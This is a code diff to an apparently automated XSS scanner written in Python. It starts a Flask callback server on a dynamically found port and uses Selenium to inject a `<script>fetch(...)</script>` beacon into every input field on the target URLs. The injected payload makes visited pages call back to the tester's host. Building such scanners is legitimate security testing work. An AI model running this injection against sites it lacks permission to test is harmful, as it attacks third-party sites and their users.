@@ -51,7 +51,7 @@ def get_private_ip():
 		return "127.0.0.1"
 
 
-def run_flask_server():
+def run_flask_server(free_port):
 	# Disable SSL verification for self-signed cert
 	#context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 	#context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')  # Use `adhoc` or generate your own
@@ -59,9 +59,11 @@ def run_flask_server():
 	log.setLevel(logging.ERROR)
 	app.logger.disabled = True
 
-	app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
+	app.run(host='0.0.0.0', port=free_port, ssl_context='adhoc')
 
-def run(targets):
+def run(targets, tools):
+	free_port = tools["open_port_finder"]()
+	#print(f"debug1: free port = {free_port}")
 	#debug
 	#return {"success": False}
 
@@ -70,7 +72,7 @@ def run(targets):
 	url_map = {i + 1: url for i, url in enumerate(targets)}
 
 	# Start the Flask server in a separate thread
-	server_thread = threading.Thread(target=run_flask_server)
+	server_thread = threading.Thread(target=run_flask_server, args=(free_port,))
 	server_thread.daemon = True
 	server_thread.start()
 
@@ -91,7 +93,8 @@ def run(targets):
 			driver.get(url)
 			time.sleep(3)
 			user_ip = get_private_ip()
-			xss_payload = f'''<script>fetch('https://{user_ip}:8080/test?index={index}');</script>'''
+			#print(f"Testing: {url}")
+			xss_payload = f'''<script>fetch('https://{user_ip}:{free_port}/test?index={index}');</script>'''
 			inputs = driver.find_elements(By.TAG_NAME, "input")
 			#print(f"[+] Found {len(inputs)} input(s)")
 			for input_element in inputs:
@@ -106,9 +109,8 @@ def run(targets):
 				except Exception:
 					pass
 					#print(f"{error} Error injecting into input")
-		except Exception:
-			pass
-			#print(f"{error} Error loading URL")
+		except Exception as e:
+			print(f"{error} Error loading {url}: {e}", flush=True)
 		finally:
 			driver.quit()
 			time.sleep(2)  # Give time for the callback to hit the server
